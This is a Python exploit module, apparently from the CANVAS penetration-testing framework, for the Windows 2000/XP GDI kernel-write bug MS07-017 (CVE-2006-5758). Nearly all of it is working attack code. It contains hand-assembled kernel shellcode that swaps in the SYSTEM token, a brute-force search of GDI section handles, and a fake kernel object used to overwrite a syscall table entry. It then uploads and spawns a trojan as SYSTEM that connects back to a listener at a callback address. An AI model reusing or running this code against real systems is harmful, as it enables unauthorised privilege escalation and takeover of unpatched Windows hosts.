#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2005
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

import os,getopt
import socket
import time

from exploitutils import *

from canvasexploit import canvasexploit
from ExploitTypes.localexploit import LocalExploit
import canvasengine
import random

from shelllistener import *
from win32MosdefShellServer import TokenPrimary 
from canvaserror import *

NAME="GDIWrite4 (MS07-017)"
DESCRIPTION="A vulnerability in the way Windows 2000/XP handles GDI structures allows for writing to kernel space"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Date public"]="11/06/2006"
DOCUMENTATION["CVE Name"] = "CVE-2006-5758"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5758"
DOCUMENTATION['CVSS'] = 7.2
DOCUMENTATION["MSRC"]="http://www.microsoft.com/technet/security/Bulletin/ms07-017.mspx"

DOCUMENTATION["Notes"]="""

This exploit will auto-target based on reading a kernel file on Windows 2000
or XP. It will generate a target fingerprint when you run the auto-targeter -
this is useful when you don't have read access to the kernel files and still want
to run the exploit. It will leave a SYSTEM token as your current token, if it succeeds

#example commandline usage on Windows 2000 SP4 English 
#we set our callback IP to 10.10.10.6 in the test lab
runmodule GDIWrite4 -l 10.10.10.6 -d 5555

Make sure you have a listener listening already before you run the above
command.
./commandlineInterface -v 1 -p 5555

If you get the wrong version, (-v 1 on an XP box, say) you'll see a PAGE FAULT
IN NON PAGED AREA bluescreen. 

On XP this was fixed with KB925902
"""

VERSION="1.0"

PROPERTY={}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Local"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['MSADV'] = "MS07-017"
PROPERTY['MS PATCHES'] = ["KB925902"]

NOTES="""
Commandline example use:
runmodule GDIWrite4 -v 1 -t 1 -l 10.10.10.6 -d 5555

"""


MAP_ADDR=0x02000000
MAX_GDI_HANDLE=0x10000
BRUSH_TYPE=16

def MAKE_DC(Upper, Index):
    return  ((Upper << 16) | Index)

W2K_PID_SYSTEM=8
W2K_OFF_PID=0x9c
W2K_OFF_FLINK=0xa0
W2K_OFF_TOKEN=0x12c
W2K_SYS_NtGdiDeleteObjectApp=0x1075
W2K_SYS_NtUserCloseDesktop=0x1142
W2K_MAX_GDI_TABLE_ENTRIES=0x4000

WXP_PID_SYSTEM=4
WXP_OFF_PID=0x84
WXP_OFF_FLINK=0x88
WXP_OFF_TOKEN=0xc8
WXP_SYS_NtGdiDeleteObjectApp=0x107a
WXP_SYS_NtUserCloseDesktop=0x114c
WXP_MAX_GDI_TABLE_ENTRIES=0x10000
#this shellcode will return our old token (which gets
#replaced by a system token) in EAX
#it takes no arguments
code_payload =  ""
code_payload += "\x64"    #/* mov eax,                  */
code_payload += "\xa1\x24\x01\x00\x00"    #/* [fs:OFF_ETHREAD]          */
code_payload += "\x8b\x40\x44"    #/* mov eax, [eax+OFF_EPROCESS]        */
code_payload += "\x89\xc1"    #/* mov ecx, eax                  */
code_payload += "\x8b\x80" + "XXXX"  #/* mov eax, [eax+OFF_FLINK]       */
code_payload += "\x2d" + "XXXX" #/* sub eax, OFF_FLINK          */
code_payload += "\x81\xb8" #/* cmp                              */
code_payload += "XXXX"  #/* dword [eax+OFF_PID],                */
code_payload += "XXXX"  #/* SYSTEM_PID                  */
code_payload += "\x75\xe9" #/* jnz FindSystemProcess    */
code_payload += "\x8b\x90" + "XXXX" #/* mov edx, [eax+OFF_TOKEN]        */
code_payload += "\x8b\x81" + "XXXX" #/* mov eax, [ecx+OFF_TOKEN]        */
code_payload += "\x89\x91" + "XXXX" #/* mov [ecx+OFF_TOKEN], edx        */
code_payload += "\xc3" #/* ret                          */

#this code takes three arguments and will restore the
#old token and the old system call
#you want to do this as soon as possible to avoid bluescreens!
code_restore = ""
code_restore +="\x64"  #/* mov eax,                     */
code_restore +="\xa1\x24\x01\x00\x00" #/* [fs:OFF_ETHREAD]              */
code_restore +="\x8b\x40\x44" #/* mov eax, [eax+OFF_EPROCESS]   */
code_restore +="\x8b\x4c\x24\x04" #/* mov ecx, [esp+4]          */
code_restore +="\x8b\x11" #/* mov edx, [ecx]            */
code_restore +="\x89\x90" + "XXXX" #/* mov [eax+OFF_TOKEN], edx   */
code_restore +="\x8b\x41\x04" #/* mov eax, [ecx+4]              */
code_restore +="\x8b\x51\x08" #/* mov edx, [ecx+8]              */
code_restore +="\x89\x10" #/* mov [eax], edx            */
code_restore +="\x8b\x51\x0c" #/* mov edx, [ecx+12]             */
code_restore +="\x89\x50\x04" #/* mov [eax+4], edx              */
#/*now restore function after our function*/
code_restore+="\x8b\x51\x0c"  #/* mov edx, [ecx+c] */
code_restore+="\x89\x50\x04"  #/* mov [eax+4], edx */
code_restore +="\xc3"   #/* ret                         */

from win32MosdefShellServer import win32shellserver

from MOSDEF.pelib import PElib

import struct 



class Gdi_Table_Entry:
    """
    Structure that can easily unpack a Gdi_Table_Entry block of memory
    """
    def __init__(self, data=None):
        self.pKernelInfo=0
        self.wProcess=0
        self.wCount=0
        self.wUpper=0
        self.wType=0
        self.pUserInfo=0
        self.fmt="<LHHHHL"
        if data!=None:
            (self.pKernelInfo, self.wProcess, self.wCount, self.wUpper, self.wType, self.pUserInfo)= struct.unpack(self.fmt, data)
        return 
            
    def raw(self):
        """
        Return a memory format string of this structure
        """
        return struct.pack(self.fmt, self.pKernelInfo, self.wProcess, self.wCount, self.wUpper, self.wType, self.pUserInfo)
            
            
#Version data for this exploit
#        dwSyscallAddr, dwOrigSysCall, dwOrigSysCall_plus
win2ksp4=(0xa016c700, 0xa006d6f2, 0xa006a1b0)
winxpsp2=(0xbf998300, 0xbf85d8d1, 0xbf85d993)

def getWin32pFromFile(filename, syscallnum):
    p=PElib()
    p.openfile(filename)
    #look in imports for keAddSystemServiceTable
    dwIAT=p.PE.getIAT("ntoskrnl.exe", "KeAddSystemServiceTable")
    if not dwIAT:
        #could not find the IAT in the file we've loaded
        return 0
    print "dwIAT: %x"%dwIAT
    #In the INIT section there is a call to our function
    #print "p.PE.Sections: %s"%p.PE.Sections
    init=p.PE.Sections["INIT\x00\x00\x00\x00"]
    print "init: %x"%init.VirtualAddress
    data=p.PE.getSectionData("INIT\x00\x00\x00\x00")
    offset=data.find("\xff\x15"+intel_order(dwIAT))
    if offset==-1:
        #did not find the call to our IAT address
        return 0
    print "offset: %x"%offset
    #now find the push for W32pServiceTable
    #thereotically the push could be several instructions back!
    offset-=5
    if data[offset]!="\x68":
        print "No push where one is expected"
    offset+=1
    addy=str2int32_swapped(data[offset:offset+4])
    #if addy not in .data section, bail
    print "addy: %x"%addy
    syscalltable=[]
    data=p.PE.data
    start=addy-p.PE.IMGOPThdr.ImageBase
    for i in xrange(0, syscallnum-0x1000+2):
        syscalltable+=[str2int32_swapped(data[start:start+4])]
        start+=4
    return addy, syscalltable
    

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name = NAME
        self.setVersions()
        self.uploaddir=None
    
    def setVersions(self):
        self.versions={}
        self.versions[0]=("Automatic")
        self.versions[1]=("Windows 2000 SP4 English", win2ksp4)
        self.versions[2]=("Windows XP SP2 English", winxpsp2)

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def getargs(self):
        self.uploaddir=self.argsDict.get("uploaddir",self.uploaddir)
    
    def getWin32pServiceTable(self, node, syscallnum):
        """
        Download WIN32K.SYS, parse it a bit and return
        the location of Win32pServiceTable
        
        if we are successful we return the addy, and syscalltable up to syscallnum+1
        """
        #first, get the SYSTEMROOT
        isinstance(node.shell, win32shellserver)
        systemroot=node.shell.GetEnvironmentVariable("SystemRoot")
        if not systemroot:
            self.log("Could not get SystemRoot!")
            return None
        
        self.log("SystemRoot=%s"%prettyprint(systemroot))
        filename=systemroot+"\\SYSTEM32\\WIN32K.SYS"
        #download this file
        #this means we REQUIRE file read access.
        #while many users will have file read access
        #others (such as remote anonymous users)
        #will not! 
        #so this is not optimal
        #but oh well.
        outfilename="WIN32K.SYS_%d"%random.randint(0,50000)
        try:
            ret=node.shell.download(filename, outfilename)
        except NodeCommandError, i:
            self.log("Could not download %s: %s" % (filename, str(i)))
            return None            
        
        self.log("Read WIN32K.SYS - now parsing it")
        ret=getWin32pFromFile(outfilename, syscallnum )
        os.unlink(outfilename)
        if not ret:
            self.log("Could not get syscall table from file!")
            return None 
        addy, syscalltable=ret 
        self.log("Success at getting Win32pServiceTable!")
        return addy, syscalltable

    def memcpy(self, node, address, data):
        vars={}
        vars["address"] = address 
        vars["data"]    = data
        vars["size"]    = len(data)

        code="""
        //start of code
        #import "local","memcpy" as "memcpy"
        #import "int", "address" as "address"
        #import "int", "size" as "size"
        #import "string", "data" as "data"

        void main() 
        {
           memcpy(address, data, size);
        }
        """
        node.shell.clearfunctioncache()
        devlog("cparse", "MEMCPY Code: %s VARS: %s"%(code, vars))
        request=node.shell.compile(code,vars)
        node.shell.sendrequest(request)
        node.shell.leave()

    
    def run_attack(self, node):
        """
        Run the attack on this node
        """
        nodename=node.getname()

        ret,nodeos=node.shell.GetVersionEx()
        self.log("Checking our initial token")
        self.log("Setting thread token to primary token for this process")
        self.exploitnodes("setthreadtoken",[node],{"token":0})
        self.log("Finding out who we are...")
        whoami=self.exploitnodes("whoami",[node])[0]
        self.log("Currently running as: %s"%whoami)
        
        if whoami.count("$"):
            #bad on non-english, but whatever
            self.log("We're already system and you're running this exploit?")
            self.log("Assuming you know better...continuing")
            
        if self.uploaddir:
            uploaddirs=[self.uploaddir]
        else:
            uploaddirs=None

        ret=self.uploadmosdeftrojan("Windows", uploaddirs=uploaddirs, node=node)

        if not ret:
            self.log("Could not upload mosdef trojan! :<")
            return 0

        mosdef_filename=ret
        
        my_code_payload=code_payload[:]
        my_code_restore=code_restore[:]
        
        #returns (ret , dictionary of (major, minor))
        if not ret:
            self.log("Could not get os on node %s"%nodename)
            return 0
        minor=nodeos["Minor Version"]
        major=nodeos["Major Version"]
        self.log("Attacking Windows Major %x Minor %x"%(major,minor))
        if major!=5 or minor>1:
            self.log("This exploit is only for Windows 2000 and Windows XP")
            return 0
        
        if minor==0:
            self.log("Windows 2000 selected")
            SYS_NtGdiDeleteObjectApp = W2K_SYS_NtGdiDeleteObjectApp
            SYS_NtUserCloseDesktop = W2K_SYS_NtUserCloseDesktop
            dwMaxGdiTableEntries = W2K_MAX_GDI_TABLE_ENTRIES
            
            my_code_payload=stroverwrite(my_code_payload,intel_order(W2K_OFF_FLINK), 13)
            my_code_payload=stroverwrite(my_code_payload,intel_order(W2K_OFF_FLINK), 18)
            my_code_payload=stroverwrite(my_code_payload,intel_order(W2K_OFF_PID), 24)
            my_code_payload=stroverwrite(my_code_payload,intel_order(W2K_PID_SYSTEM), 28)
            my_code_payload=stroverwrite(my_code_payload,intel_order(W2K_OFF_TOKEN), 36)
            my_code_payload=stroverwrite(my_code_payload,intel_order(W2K_OFF_TOKEN), 42)
            my_code_payload=stroverwrite(my_code_payload,intel_order(W2K_OFF_TOKEN), 48)

            my_code_restore=stroverwrite(my_code_restore,intel_order(W2K_OFF_TOKEN), 17)
        else:
            self.log("Using XP Version")
            SYS_NtGdiDeleteObjectApp = WXP_SYS_NtGdiDeleteObjectApp
            SYS_NtUserCloseDesktop = WXP_SYS_NtUserCloseDesktop
            dwMaxGdiTableEntries = WXP_MAX_GDI_TABLE_ENTRIES
            my_code_payload=stroverwrite(my_code_payload,intel_order(WXP_OFF_FLINK), 13)
            my_code_payload=stroverwrite(my_code_payload,intel_order(WXP_OFF_FLINK), 18)
            my_code_payload=stroverwrite(my_code_payload,intel_order(WXP_OFF_PID), 24)
            my_code_payload=stroverwrite(my_code_payload,intel_order(WXP_PID_SYSTEM), 28)
            my_code_payload=stroverwrite(my_code_payload,intel_order(WXP_OFF_TOKEN), 36)
            my_code_payload=stroverwrite(my_code_payload,intel_order(WXP_OFF_TOKEN), 42)
            my_code_payload=stroverwrite(my_code_payload,intel_order(WXP_OFF_TOKEN), 48)

            my_code_restore=stroverwrite(my_code_restore,intel_order(WXP_OFF_TOKEN), 17)

        #dwMinGdiTableSize = dwMaxGdiTableEntries * sizeof(GDITableEntry)
        #I think 16 is correct here. We'll know if we bluescreen, I guess :>
        dwMinGdiTableSize = dwMaxGdiTableEntries*16
        if self.version==0:
            self.log("Determining address to overwrite")
            #download WIN32K.sys and find the KeAddServiceTable
            #then do some minor parsing to find Win32pServiceTable
            #do this with PELib.py

            ret=self.getWin32pServiceTable(node, SYS_NtUserCloseDesktop)
            if not ret:
                self.log("Could not get syscall table!")
                return 0
            win32pServiceTable, syscalltable=ret
            dwOrigSyscall=syscalltable[SYS_NtUserCloseDesktop-0x1000]
            dwOrigSyscall_plus=syscalltable[SYS_NtUserCloseDesktop-0x1000+1]
            self.log("This version of windows: (0x%x, 0x%x, 0x%x)"%(win32pServiceTable, dwOrigSyscall, dwOrigSyscall_plus))
        else:
            win32pServiceTable, dwOrigSyscall, dwOrigSyscall_plus=self.versions[self.version][1]
        
        dwSysCallAddr = win32pServiceTable+(SYS_NtUserCloseDesktop-0x1000)*4
        self.log("Win32pServiceTable=%x"%win32pServiceTable)
        self.log("dwSysCallAddr=%x"%dwSysCallAddr)
        
        #allocate space for shellcode
        mapaddress=0
        ret=node.shell.NtAllocateVirtualMemory(mapaddress)
        if ret!=0:
            self.log("NtAllocateVirtualMemory Failed!")
            #return 0
            self.log("Someone's already mapped address zero")
        #now copy shellcode into address 2
        self.memcpy(node, 2, my_code_payload)
        #now create a GDI object
        hBR=node.shell.CreateSolidBrush(0)
        self.log("Solid brush handle: %x"%hBR)
        self.log("Bruteforcing GDI Section Handle")
        hMap=0
        wUPR=hBR >> 16
        wIDX=hBR & 0xffff
        self.log("wUPR=%x wIDX=%x"%(wUPR, wIDX))
        lpAddr=0
        MAX_GDI_HANDLE=0x10000
        pid=dInt(self.exploitnodes("getpid",[node])[0][0])
        hMap=0
        while hMap<MAX_GDI_HANDLE:
            if lpAddr:
                self.log("Closing handle: %x"%(lpAddr))
                node.shell.UnmapViewOfFile(lpAddr)
            hMap, lpAddr=node.shell.getNextMappableHandle(hMap,MAX_GDI_HANDLE)
            if hMap==0:
                self.log("Reached MAX_GDI_HANDLE")
                break 
            self.log("Trying handle: %x"%hMap)

            ret, sec=node.shell.QuerySection(hMap)
            if ret<0:
                hMap+=1
                continue
            self.log("Length of sec: %d"%len(sec))
            #self.log("sec: %s"%prettyhexprint(sec))
            SectionSize=sec[8:]
            QuadPart=str2int64_swapped(SectionSize)
            self.log("QuadPart = %d, dwMinGdiTableSize= %d"%(QuadPart,dwMinGdiTableSize))
            if QuadPart < dwMinGdiTableSize:
                hMap+=1
                continue
            """
          typedef struct __attribute__((packed)) {
          DWORD pKernelInfo;
          WORD wProcess;
          WORD wCount;
          WORD wUpper;
          WORD wType;
          DWORD pUserInfo;
          } GDITableEntry;
            """
            #16==sizeof(GDI_TABLE_ENTRY)
            gdiTableEntrySize=16
            GTEaddr=lpAddr+gdiTableEntrySize*wIDX
            data=node.shell.memread(GTEaddr, gdiTableEntrySize )
            #Is this the real GDI section? 
            #DC handle to the window we created exists and has the right values

            GTE=Gdi_Table_Entry(data)
            savedGTE=Gdi_Table_Entry(data)
            if (GTE.wProcess==pid and
                GTE.wUpper==wUPR and
                GTE.wType==BRUSH_TYPE ):
                self.log("Found GDI table entry!")
                break
            else:
                self.log("Did not find our Gdi Table Entry")
                self.log("pid=%d wUpper=%d wType=%d"%(pid, wUPR, BRUSH_TYPE))
                self.log("Found: %d %d %d"%(GTE.wProcess, GTE.wUpper, GTE.wType))
            hMap+=1
        
        if hMap in [0, MAX_GDI_HANDLE]:
            self.log("GDI Table Entry not found!")
            #virtualFree
            return False 
        self.log("Writable GDI Section mapped: %x"%lpAddr)
        self.log("Writable GDI Section Handle: %x"%hMap)
        self.log("Making fake kernelspace brush object")
        fakeobj="\x00"*(64*4) #64 dwords - a fake kernelinfo object
        dwDC=MAKE_DC(GTE.wUpper, wIDX)
        fakeobj=stroverwrite(fakeobj, intel_order(dwDC), 0)
        fakeobj=stroverwrite(fakeobj, intel_order(0xbadc0ded), 4)
        fakeobj=stroverwrite(fakeobj, intel_order(1), 8)
        #this is our write4 addrss (we overwrite it with 0000002
        fakeobj=stroverwrite(fakeobj, intel_order(dwSysCallAddr), 9*4)
        fakeAddr=node.shell.malloc(len(fakeobj))
        
        if fakeAddr==0:
            self.log("Could not allocate space for fakeAddr!")
            return False 
            
        self.memcpy(node, fakeAddr, fakeobj)
        GTE.pKernelInfo=fakeAddr
        data=GTE.raw()
        oldGTEdata=node.shell.memread(GTEaddr, len(data))
        self.memcpy(node, GTEaddr, data)

        self.log("Triggering call to deletebrush")
        self.log("write4(0x00000002, %x)"%dwSysCallAddr)
        self.log("SYS_NtGdiDeleteObjectApp %x, dwDC %x"%(SYS_NtGdiDeleteObjectApp, dwDC))
        node.shell.RawSyscall(SYS_NtGdiDeleteObjectApp, dwDC)
        
        self.log("Calling NTUserCloseDesktop to call our shellcode")
        #the shellcode returns our token, how nice!
        dwOldToken=node.shell.RawSyscall(SYS_NtUserCloseDesktop, 0) #the zero here is no argument
        self.log("Old token=%x"%dwOldToken)

        self.log("We should be system...")
        ret=self.exploitnodes("whoami", [node])[0]
        if ret.count("$"): 
            #this won't work on non-english systems I bet.
            self.log("System! :>") 
            
        #now our payload where we do something before we restore
        #the system. You want to restore before someone else calls NtUserCloseDesktop
        #which will bluescreen the box (as it will call 0x2 for no good reason)
        #if self.payload=="getnewtoken": ...
        #get a new impersonation token as local system, and use it
        method="process"
        if method=="token":
            token=node.shell.openprocesstoken()
            self.log("GetProcessToken returned %x"%token)
            ret, processtoken=node.shell.DuplicateToken(token, TokenType=TokenPrimary)
            if ret:
                self.log("New process token: %x"%processtoken)
            ret, newtoken=node.shell.DuplicateToken(token)
            if ret:
                node.shell.SetThreadToken(newtoken)
                self.log("Set new token to a duplicated system token: %x"%newtoken)
            else:
                self.log("ERROR: Could not duplicate token!")
        
        if method=="process":
            ret=node.shell.dospawn(mosdef_filename)

        self.log("Restoring tokens and syscalls")
        self.memcpy(node, 0x2, my_code_restore)
        #now that shellcode is in place, we need to pass arguments to it
        #this means we pass the address of an array
        #of dwOldToken/dwSysCallAddr/dwOrigSyscall
        arguments=intel_order(dwOldToken)+intel_order(dwSysCallAddr)+intel_order(dwOrigSyscall)+intel_order(dwOrigSyscall_plus)
        #copy this into the 0th section of ram, just as scratch space
        argAddr=0x500
        self.memcpy(node, argAddr, arguments)
        
        self.log("Calling NTUserCloseDesktop")
        node.shell.RawSyscall(SYS_NtUserCloseDesktop, argAddr)
        if method=="token":
            self.log("We should still be system...")
            self.exploitnodes("whoami", [node])
    
            #setthreadtoken the last token 
            #as side effect
            self.log("Original token should be restored as token 0")
            self.exploitnodes("getthreadsinfo", [node])
            
            #reset our token back to local system token
            node.shell.SetThreadToken(newtoken)

        #restore our old GTE data
        self.memcpy(node, GTEaddr, oldGTEdata)

        #free memory, and done
        node.shell.UnmapViewOfFile(lpAddr)        
        #virtualfree(1)
        if method=="process":
            time.sleep(3)
            ret=self.ISucceeded()
        else:
            ret=1
        return ret 
    
    def run(self):
        """
        This run happens on all nodes selected
        returns 1 if we succeed on any node
        """
        self.setInfo("%s (in progress)"%(NAME))
        self.getargs()
        success=0 
        for node in self.argsDict["passednodes"]:            
            type = node.nodetype
            nodename=node.getname()
            caps= node.capabilities
            if "win32api" not in caps:
                self.log("Node %s not a Win32 node..."%nodename)
                continue
            ret=self.run_attack(node)
            if ret:
                success=1
        return success

if __name__=="__main__":
    print "This win32 local module is meant to be run only within CANVAS"
    outfilename=sys.argv[1]
    ret=getWin32pFromFile(outfilename, W2K_SYS_NtUserCloseDesktop)
    if ret:
        syscalltable=ret[1]
        print "NtUserCloseDesktop=%x"%(syscalltable[W2K_SYS_NtUserCloseDesktop-0x1000])
